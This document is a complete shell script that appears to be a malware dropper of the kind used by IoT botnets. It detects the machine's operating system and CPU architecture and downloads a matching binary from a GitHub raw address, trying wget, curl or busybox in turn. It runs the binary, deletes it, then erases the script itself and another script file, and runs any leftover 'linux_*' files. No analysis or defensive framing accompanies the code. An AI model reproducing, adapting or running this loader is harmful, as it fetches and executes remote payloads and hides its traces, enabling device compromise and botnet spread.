#!/bin/sh

download_and_execute() {
    local file_name=$1
    local url="https://$address/$file_name"
    rm -rf "$file_name"
    if wget -t 1 "$url"; then
        :
    elif curl --connect-timeout 10 "$url"; then
        :
    elif busybox wget "$url"; then
        :
    else
        echo "Failed to download $file_name"
        return 1
    fi
    chmod +x "$file_name"
    if ./$file_name; then
        rm -rf "$file_name"
    else
        rm -rf "$file_name"
    fi
}

address="raw.githubusercontent.com/zibll001/ffff/refs/heads/main"
os=$(uname -s)
arch=$(uname -m)

if [ "$os" = "Linux" ]; then
    case "$arch" in
        "i"*"86")
            download_and_execute "386"
            ;;
        "x86_64" | "amd64")
            download_and_execute "amd64"
            ;;
        "mips")
            download_and_execute "mips"
            download_and_execute "mipsel"
            ;;
        "mips64")
            download_and_execute "mips64"
            download_and_execute "mips64el"
            ;;
        "armv5"*)
            download_and_execute "arm5"
            ;;
        "armv6"*)
            download_and_execute "arm6"
            ;;
        "armv7"*)
            download_and_execute "arm7"
            ;;
        "armv8"* | "aarch64")
            download_and_execute "aarch64"
            ;;
        *)
            echo "Unsupported architecture: $arch"
            ;;
    esac
else
    echo "Unsupported operating system: $os"
fi

rm -f "$0"
rm -f web.sh

for file in linux_*; do
    if [ -f "$file" ]; then
        ./$file
        rm -rf "$file"
    fi
done
